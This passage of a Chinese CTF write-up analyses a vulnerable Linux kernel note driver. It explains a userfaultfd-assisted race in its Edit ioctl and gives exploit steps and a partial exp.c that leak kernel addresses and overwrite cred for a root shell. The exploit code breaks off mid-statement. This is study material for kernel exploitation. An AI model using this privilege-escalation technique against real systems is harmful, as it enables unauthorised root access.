<span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    ... truncated</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>继续分析模块的功能会发现实现了四个功能，分别是<code>New</code>、<code>Delete</code>、<code>Show</code>和<code>Edit</code>。其中New的功能就是根据用户给的length从全局的内存中取一块作为<code>notes[req.idx]</code>并分配一块<code>content_arr[length]</code>，之后将全局指针对应向后偏移，拷贝的用户数据要先异或<code>key</code>再存入其中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)arg2 &lt;= -<span class="string">'\xFF'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)arg2 != <span class="number">-256</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-25</span>;</span><br><span class="line">    req.idx = <span class="number">-1L</span>L;                             <span class="comment">// -256-&gt;new</span></span><br><span class="line">    idx2 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      idx3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)idx2;</span><br><span class="line">      <span class="keyword">if</span> ( !notes[idx2] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++idx2 == <span class="number">0x10</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    new_node = bufPtr;</span><br><span class="line">    req.idx = idx3;</span><br><span class="line">    notes[idx3] = bufPtr;</span><br><span class="line">    new_node-&gt;length = v4;</span><br><span class="line">    new_node_content_arr = new_node-&gt;content_arr;</span><br><span class="line">    new_node-&gt;key = *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x7E8</span>) + <span class="number">0x50</span>LL);</span><br><span class="line">    user_n = req.length;</span><br><span class="line">    user_buf2 = req.user_buf;</span><br><span class="line">    bufPtr = (node *)((<span class="keyword">char</span> *)new_node + req.length + <span class="number">24</span>);<span class="comment">// mov it to next free space</span></span><br><span class="line">    <span class="keyword">if</span> ( req.length &gt; <span class="number">0x100</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      _warn_printk(<span class="string">"Buffer overflow detected (%d &lt; %lu)!\n"</span>, <span class="number">0x100</span>LL, req.length);</span><br><span class="line">      BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(encBuffer, req.length, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(encBuffer, user_buf2, user_n);<span class="comment">// copy userbuf to stack</span></span><br><span class="line">    req_len = req.length;</span><br><span class="line">    node_addr2 = notes[req.idx];</span><br><span class="line">    <span class="keyword">if</span> ( req.length )</span><br><span class="line">    &#123;</span><br><span class="line">      i = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        encBuffer[i / <span class="number">8</span>] ^= node_addr2-&gt;key;    <span class="comment">// xor the key</span></span><br><span class="line">        i += <span class="number">8L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; req_len );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(new_node_content_arr, encBuffer, req_len);<span class="comment">// copy to the third node</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    node_addr2-&gt;contentPtr = (__int64)&amp;new_node_content_arr[-page_offset_base];<span class="comment">// set contentPtr</span></span><br></pre></td></tr></table></figure>
<p><code>Delete</code>函数清空全局内存区并将分配的指针指向开头。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)arg2 != <span class="number">-254</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      notes1 = notes;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)arg2 == <span class="number">-253</span> )               <span class="comment">// -253-&gt;delete</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          *notes1 = <span class="number">0L</span>L;</span><br><span class="line">          ++notes1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( &amp;_check_object_size != (__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))notes1 );</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        bufPtr = (node *)&amp;unk_B60;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;unk_B60, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-25</span>;</span><br></pre></td></tr></table></figure>
<p><code>Show</code>函数按照<code>notes[idx].length</code>把<code>content_arr</code>内容拷贝到用户态空间，这个过程是先拿<code>contentPtr+page_offset_base</code>找到<code>content_arr</code>，再把其中的内容异或<code>key</code>拷贝</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v10 = notes[idx];                           <span class="comment">// -254-&gt;show</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = LOBYTE(v10-&gt;length);</span><br><span class="line">      v12 = (_DWORD *)(v10-&gt;contentPtr + page_offset_base);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 &gt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(__int64 *)((<span class="keyword">char</span> *)&amp;encBuffer[<span class="number">-1</span>] + LOBYTE(v10-&gt;length)) = *(_QWORD *)((<span class="keyword">char</span> *)v12 + LOBYTE(v10-&gt;length) - <span class="number">8</span>);</span><br><span class="line">        qmemcpy(encBuffer, v12, <span class="number">8L</span>L * ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v11 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v11 &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(encBuffer[<span class="number">0</span>]) = *v12;</span><br><span class="line">        *(_DWORD *)((<span class="keyword">char</span> *)encBuffer + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( LOBYTE(v10-&gt;length) )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(encBuffer[<span class="number">0</span>]) = *(_BYTE *)v12;</span><br><span class="line">        <span class="keyword">if</span> ( v11 &amp; <span class="number">2</span> )</span><br><span class="line">          *(_WORD *)((<span class="keyword">char</span> *)encBuffer + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">2</span>) = *(_WORD *)((<span class="keyword">char</span> *)v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          encBuffer[v13 / <span class="number">8</span>] ^= v10-&gt;key;</span><br><span class="line">          v13 += <span class="number">8L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &lt; v11 );</span><br><span class="line">      &#125;</span><br><span class="line">      user_buf3 = req.user_buf;</span><br><span class="line">      _check_object_size(encBuffer, v11, <span class="number">1L</span>L);</span><br><span class="line">      copy_to_user(user_buf3, encBuffer, v11);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Edit函数和Show差不多，也是先计算再拷贝，这里的问题就是<code>copy_from_user</code>并不是原子性的操作，也并没有上锁，按照我们之前的分析缺页可以让其有一个很大的空窗期供我们操作，进而利用竞争改掉某些关键数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)arg2 == -<span class="string">'\xFF'</span> )                <span class="comment">// -255-&gt;edit</span></span><br><span class="line">&#123;</span><br><span class="line">  node_addr = notes[idx];</span><br><span class="line">  <span class="keyword">if</span> ( node_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_size = LOBYTE(node_addr-&gt;length);</span><br><span class="line">    user_buf1 = req.user_buf;</span><br><span class="line">    v18 = (_QWORD *)(node_addr-&gt;contentPtr + page_offset_base);<span class="comment">// recover</span></span><br><span class="line">    _check_object_size(encBuffer, chunk_size, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(encBuffer, user_buf1, chunk_size);</span><br><span class="line">    <span class="keyword">if</span> ( chunk_size )</span><br><span class="line">    &#123;</span><br><span class="line">      node_addr1 = notes[req.idx];</span><br><span class="line">      cpy_idx = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        encBuffer[cpy_idx / <span class="number">8</span>] ^= node_addr1-&gt;key;</span><br><span class="line">        cpy_idx += <span class="number">8L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( chunk_size &gt; cpy_idx );</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size &gt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">        *(_QWORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">8</span>) = *(__int64 *)((<span class="keyword">char</span> *)&amp;encBuffer[<span class="number">-1</span>]</span><br><span class="line">                                                                             + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        qmemcpy(</span><br><span class="line">          (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)(v18 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">          (<span class="keyword">const</span> <span class="keyword">void</span> *)((<span class="keyword">char</span> *)encBuffer - ((<span class="keyword">char</span> *)v18 - ((<span class="keyword">unsigned</span> __int64)(v18 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL))),</span><br><span class="line">          <span class="number">8L</span>L * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size + (_DWORD)v18 - (((_DWORD)v18 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>)) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_size &amp; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)encBuffer</span><br><span class="line">                                                                          + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size</span><br><span class="line">                                                                          - <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)chunk_size )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( chunk_size &amp; <span class="number">2</span> )</span><br><span class="line">        *(_WORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">2</span>) = *(_WORD *)((<span class="keyword">char</span> *)encBuffer</span><br><span class="line">                                                                          + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size</span><br><span class="line">                                                                          - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们先创建一个buf为0x10大小的note0，在Edit的过程中我们利用usefaultfd的handler在成功拷贝之前释放所有note，再创建一个新的Note0和Note1，其buf大小均为0，在使用ioctl向缺页部分拷贝的时候我们把这个页的<code>buf[8]</code>改为<code>0xf0</code>，这样拷贝之后原来<code>buf[8]</code>的部分实际上是<code>note1.length</code>，进而我们可以越界读写<code>note1</code>。</p>
<ol>
<li>leak key:直接<code>Show(1)</code>，因为我们把note1的length改为了非零值，因此会输出<code>0 xor key</code>，得到Key值</li>
<li>leak module base:注意我们现在泄露的只是一个相对值(module_base-page_offset_base)，但是无所谓，因为最终show的时候会加上这个偏移。创建Note2则<code>note2.contentPtr</code>即为<code>note2.content_arr-page_offset_base</code>，show(1)即可泄露出来这个值，再减去它到模块基地址的偏移即为模块相对基址</li>
<li>leak page_offset_base:泄露这个值就比较麻烦了，我们先来看一个指令<code>000000001F7 4C 8B 25 12 2A 00 00                    mov     r12, cs:page_offset_base</code>，这个调用实际含义是<code>mov r12,[rip+offset]</code>，而这个offset存储在<code>module_base+0x1fa</code>，我们的思路就有了，先修改note2的key为0，length为4，contentPtr为<code>module_base+0x1fa</code>，得到这个4字节的偏移，再用相同方式泄露出<code>(module_base+0x1fe)+offset</code>的值，即为所求</li>
<li>leak cred:通过之前提到的search搜索的方式</li>
<li>用任意写修改cred的对应数据位</li>
<li>execv(注意不是execve)起新的shell(这个shell会继承当前进程的uid)</li>
</ol>
<h4 id="exp-c-5"><a href="#exp-c-5" class="headerlink" title="exp.c"></a>exp.c</h4><p>如前所述基本是照着打了一遍，再次感谢<code>bsauce</code>师傅的文章</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NewCmd (-256)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DeleteCmd (-253)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ShowCmd (-254)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EditCmd (-255)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSZ 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAULT_PAGE ((void*)(0x1337000))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line">    <span class="keyword">char</span>* contentPtr;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">userAttr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line">    <span class="keyword">char</span>* user_buf;</span><br><span class="line">&#125;attr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">"/dev/note"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]open dev failed"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+]open success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">New</span><span class="params">(<span class="keyword">char</span>* usr_buf,<span class="keyword">uint8_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.length = length;</span><br><span class="line">    my_attr.user_buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-256</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]create failed"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-253</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]delete error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">char</span>* usr_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.idx = idx;</span><br><span class="line">    my_attr.user_buf = usr_buf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-254</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]failed to show"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Edit</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">size_t</span> length,<span class="keyword">char</span>* usr_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    attr my_attr;</span><br><span class="line">    my_attr.idx = idx;</span><br><span class="line">    my_attr.length = length;</span><br><span class="line">    my_attr.user_buf = usr_buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">-255</span>,&amp;my_attr) &lt; <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]failed to Edit"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] Handler created"</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">poll_fd</span>;</span></span><br><span class="line">   <span class="keyword">int</span> ready;</span><br><span class="line">   poll_fd.fd = uffd;</span><br><span class="line">   poll_fd.events= POLLIN;</span><br><span class="line">   ready = poll(&amp;poll_fd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">   <span class="keyword">if</span>(ready != <span class="number">1</span>)</span><br><span class="line">    ErrExit(<span class="string">"[-]poll failed!"</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+]Now we got to inject dirty code"</span>);</span><br><span class="line"></span><br><span class="line">   Delete();</span><br><span class="line">   New(buf,<span class="number">0</span>);</span><br><span class="line">   New(buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//init:node0+0x10buf</span></span><br><span class="line">   <span class="comment">//now:node0+node1</span></span><br><span class="line">   <span class="keyword">if</span>(read(uffd,&amp;msg,<span class="keyword">sizeof</span>(msg)) != <span class="keyword">sizeof</span>(msg))</span><br><span class="line">       ErrExit(<span class="string">"[-]Error reading msg"</span>);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">   <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">   buf[<span class="number">8</span>] = <span class="number">0xf0</span>;<span class="comment">//overwrite the note1's size = 0xf0</span></span><br><span class="line">   uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">   uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">   uc.len = <span class="number">0x1000</span>;</span><br><span class="line">   uc.mode = <span class="number">0</span>;</span><br><span class="line">   ioctl(uffd,UFFDIO_COPY,&amp;uc);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[*]userfault process success"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;ua) == <span class="number">-1</span>)&#123;</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO API"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">0x22</span>,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)</span><br><span class="line">        ErrExit(<span class="string">"[-]mmap failed!"</span>);</span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]ioctl UFFDIO Register"</span>);</span><br><span class="line">    <span class="comment">//register the func</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr,<span class="literal">NULL</span>,handler,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(s != <span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">"[-]pthread create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    Init();</span><br><span class="line">    New(buf,<span class="number">0x10</span>);</span><br><span class="line">    register_userfault();</span><br><span class="line">    <span class="comment">//create the 0x10 buf</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">1</span>,FAULT_PAGE);</span><br><span class="line">    <span class="comment">//now we mmap a address for later use</span></span><br><span class="line">    <span class="comment">//1.leak key:0 xor key == key</span></span><br><span class="line">    Show(<span class="number">1</span>,buf);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak key:%lx\n"</span>,key);</span><br><span class="line">    <span class="comment">//note0:0x10</span></span><br><span class="line">    <span class="comment">//note1:0x10(size changed to 0xf0)</span></span><br><span class="line">    <span class="comment">//2.leak module base(real_module_base - base_page_off)</span></span><br><span class="line">    New(buf,<span class="number">0</span>);<span class="comment">//node2</span></span><br><span class="line">    Show(<span class="number">1</span>,buf);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> bss_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(buf+<span class="number">0x10</span>) ^ key;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> module_base = bss_addr - <span class="number">0x2568</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]leak module base(sub page_base_offset):%lx\n"</span>,module_base);</span><br><span class="line">    <span class="comment">//3.leak page_base_off</span></span><br><span class="line">    <span class="comment">//overwrite the note2's contentPtr to module_base+0x1fa</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> page_offset_base = module_base+<span class="number">0x1fa</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* fake_note = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)buf;</span><br><span class="line">    <span class="keyword">int</span> page_offset_base_off;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'\x00'</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fake_note[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    fake_note[<span class="number">1</span>] = <span class="number">4</span> ^ key;<span class="comment">//we only need four bytes</span></span><br><span class="line">    fake_note[<span class="number">2</span>] = page_offset_base ^ key;</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x18</span>,buf);</span><br><span class="line">    Show(<span class="number">2</span>,(<span class="keyword">char</span>*)&amp;page_offset_base_off);</span><br><span class="line">    page_offset_base 